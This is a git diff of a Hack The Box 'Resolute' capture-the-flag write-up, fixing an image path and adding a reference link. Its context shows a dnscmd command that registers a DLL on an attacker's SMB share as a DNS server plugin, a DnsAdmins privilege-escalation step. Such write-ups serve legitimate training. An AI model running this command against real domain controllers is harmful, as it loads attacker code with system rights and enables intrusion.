@@ -3,7 +3,7 @@ title: HTB - Resolute
 date: 2024-03-18
 categories: [CTF, Fullpwn]
 tags: [htb, hackthebox, resolute, nmap, netexec, nxc, smb, null-session, password-spray, dnscmd, dns-admins, msfvenom, psexec, active-directory, windows, sharphound, bloodhound, winrm, evil-winrm]
-img_path: /assets/htb/fullpwn/sauna
+img_path: /assets/htb/fullpwn/resolute
 published: true
 image:
     path: machine_info.png
@@ -334,7 +334,7 @@ Impacket v0.12.0.dev1+20231027.123703.c0e949fe - Copyright 2023 Fortra
 [*] Config file parsed
 ```
 
-Set the remote DLL path into the Windows Registry on the target:
+Set the remote DLL path into the Windows Registry on the target ([_command_](https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/)):
 
 ```bash
 *Evil-WinRM* PS C:\Users\ryan> dnscmd.exe /config /serverlevelplugindll \\10.10.14.25\share\da.dll
